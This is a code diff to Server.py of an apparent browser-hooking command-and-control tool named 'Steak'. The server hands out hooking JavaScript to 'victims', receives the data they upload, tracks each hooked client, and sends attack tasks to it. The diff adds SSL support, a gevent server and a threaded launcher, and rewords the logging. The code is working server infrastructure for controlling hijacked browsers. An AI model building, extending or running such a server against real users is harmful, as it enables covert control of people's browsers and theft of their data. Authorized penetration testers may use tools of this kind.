@@ -1,4 +1,5 @@
 from flask import Flask,Response,request
+from gevent.pywsgi import WSGIServer
 import uuid
 import os
 import json
@@ -9,7 +10,8 @@ from steak.utils import base64decode,base64encode
 from .Project import Project
 from .Logger import Logger
 from .Client import Client
-import _thread
+from threading import Thread
+import logging
 
 class Server:
     '''
@@ -17,10 +19,12 @@ class Server:
     It can receive information submited by victim and dispatch the information to attack_client function the victim corresponds to 
     It can also provide hooking javascript to victim and send task to victim
     '''
-    def __init__(self,ip:str,port:int,projects,callbackpath:str) -> None:
-        self.logger = Logger(logger="Server.py")
+    def __init__(self,ip:str,port:int,projects,callbackpath:str,sslpem:str,sslkey:str) -> None:
+        self.logger = Logger()
         self.ip=ip
         self.port=port
+        self.sslpem=sslpem
+        self.sslkey=sslkey
         self.projects=projects
         self.callbackpath=callbackpath #callback path is the path to receive information submited by victims
         self.path2callback={} # A map that maps specially registered path via register_path to its callback function
@@ -28,6 +32,14 @@ class Server:
         self.clientid2client={} #A map that maps clientid to client object
         self.taskid2payloadobj={} #A map that maps taskid to payload object
         self.clientids=set() #a set of all client id
+        if self.sslkey and self.sslpem:
+            self.protocol='https://'
+            self.isssl=1
+            self.ssldict={"keyfile":self.sslkey, "certfile":self.sslpem}
+        else:
+            self.protocol='http://'
+            self.isssl=0
+            self.ssldict={}
         #As different url of hooking javascript corresponds to different project,we can not have duplicate js urls
         for project in self.projects:
             if project.jsurl in self.jsurl2projects:
@@ -77,7 +89,6 @@ class Server:
         app = Flask(__name__)
         app.config['SESSION_TYPE'] = 'filesystem'
 
-
         @app.route(self.callbackpath,methods=['GET','POST'])
         def callbackpath():
             '''
@@ -94,18 +105,21 @@ class Server:
                 dataupload['clientipaddress']=clientip
             
             if clientid not in self.clientid2client:
+                '''
+                A new client start to callback
+                '''
                 try:
                     client=Client(clientid,project,dataupload)
-                    self.logger.info(f'A new client connected to us with ip address {clientip} with clientid {client.clientid}')
+                    self.logger.good(f'New Client of Project {project.project_name} Connected: IP {clientip} ClientId {client.clientid}')
                 except Exception as e: 
-                    #print(e)
                     #Error occurs because we restarted our server so that we've forgot the victim who remembers us
-                    self.logger.info(f'A client we forgot connected to us with ip address {clientip}')
+                    self.logger.warning(f'Old Client Connected with Invalid ClientId with IP {clientip}. We Call it to Reconnect with New ClientId Soon.')
                     return self.generate_response('Restart') #forget me and restart !
                 self.clientid2client[clientid]=client
                 project.clients[clientid]=client
                 #Starts a new thread to deal with the victim 
-                _thread.start_new_thread( project.attack_client, (client,))
+                t = Thread(target=project.attack_client, args=(client,))
+                t.start()
                 return self.generate_response('')
             else:
                 client=self.clientid2client[clientid]
@@ -119,7 +133,7 @@ class Server:
             '''
             if dataupload!="Rollback":
                 taskid=content['clientbasicinfo']['taskid']
-                self.logger.info(f'An old client with clientid {client.clientid} finished its task with taskid:{taskid}')
+                self.logger.info(f'Client {client.clientid} of Project {project.project_name} Finished Task {taskid}')
                 payloadobj=self.taskid2payloadobj[taskid]
                 result=payloadobj.module.parse_result(dataupload)
                 client.taskresult[taskid]=result
@@ -133,10 +147,10 @@ class Server:
             task=client.pop_latest_task()
             if task:
                 self.taskid2payloadobj[task.taskid]=task
-                self.logger.info(f'sending task with {task.taskid} to client with ip address {clientip} and clientid {client.clientid}')
+                self.logger.info(f'Sending Task {task.taskid} to Client {client.clientid} of Project {project.project_name}')
                 return self.generate_response(task.payload_str)
             else:
-                self.logger.debug(f'no task for client with ip address {clientip} and clientid {client.clientid}')
+                self.logger.debug(f'Client {client.clientid} of Project {project.project_name} Called Home')
                 return self.generate_response('')
             
 
@@ -166,5 +180,21 @@ class Server:
             resp=Response(project.generate_js(self.get_full_callback_path(),project.jsurl))
             resp.headers['Content-Type'] = 'text/javascript;charset=UTF-8'
             return resp
+        
+        if self.logger.getLevel==logging.DEBUG:
+            gevent_server = WSGIServer((self.ip, self.port), app,**self.ssldict)
+        else:
+            gevent_server = WSGIServer((self.ip, self.port), app,log = None, **self.ssldict)
 
-        app.run(host=self.ip,port=self.port)
+        self.logger.info(f'Running the Steak Server at {self.protocol}{self.ip}:{self.port}/')
+        gevent_server.serve_forever()
+        
+    
+    def run_thread(self):
+        '''
+        Start a server thread
+        '''
+        t = Thread(target=self.run)
+        t.setDaemon(True)
+        t.start()
+        return t
